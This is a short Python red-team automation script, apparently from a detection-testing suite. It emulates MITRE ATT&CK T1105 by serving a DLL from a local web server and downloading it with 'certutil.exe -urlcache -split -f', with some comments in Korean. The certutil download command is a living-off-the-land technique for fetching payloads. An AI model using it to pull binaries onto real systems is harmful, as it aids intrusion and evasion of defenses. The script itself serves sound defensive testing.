# Name: Downloading Files With Certutil
# RTA: certutil_webrequest.py
# ATT&CK: T1105
# Ref. https://attack.mitre.org/techniques/T1105/
# Description: Uses certutil.exe to download a file.
import common

# 현재 경로 + bin/mydll.dll 경로를 return한다.
MY_DLL = common.get_path("bin", "mydll.dll")


@common.dependencies(MY_DLL)
def main():
    # http server will terminate on main thread exit
    # if daemon is True
    server, ip, port = common.serve_web()

    uri = "bin/mydll.dll"
    target_file = "mydll.dll"
    common.clear_web_cache()
	# ref. https://wikidocs.net/13#_15
    url = "http://{ip}:{port}/{uri}".format(ip=ip, port=port, uri=uri)
	# ref. https://koromoon.blogspot.com/2018/01/certutil.html
    common.execute(["certutil.exe", "-urlcache", "-split", "-f", url, target_file])

    server.shutdown()
    common.remove_file(target_file)


if __name__ == "__main__":
    exit(main())
